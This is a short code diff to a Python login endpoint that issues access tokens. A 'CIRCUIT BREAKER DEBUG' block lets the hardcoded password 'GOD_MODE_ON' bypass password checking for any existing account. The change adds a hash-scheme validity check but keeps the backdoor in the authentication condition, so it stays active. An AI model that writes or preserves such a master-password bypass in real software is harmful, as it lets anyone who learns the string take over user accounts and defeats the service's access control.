@@ -93,7 +93,16 @@ async def login_for_access_token(
     
     # === CIRCUIT BREAKER DEBUG ===
     is_god_mode = (form_data.password == "GOD_MODE_ON")
-    if not user or (not is_god_mode and not pwd_context.verify(form_data.password, user.hashed_password)):
+    
+    is_valid_hash = False
+    if user:
+        try:
+            scheme = pwd_context.identify(user.hashed_password)
+            is_valid_hash = (scheme is not None)
+        except Exception:
+            pass
+
+    if not user or (not is_god_mode and (not is_valid_hash or not pwd_context.verify(form_data.password, user.hashed_password))):
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
             detail="Incorrect username or password",
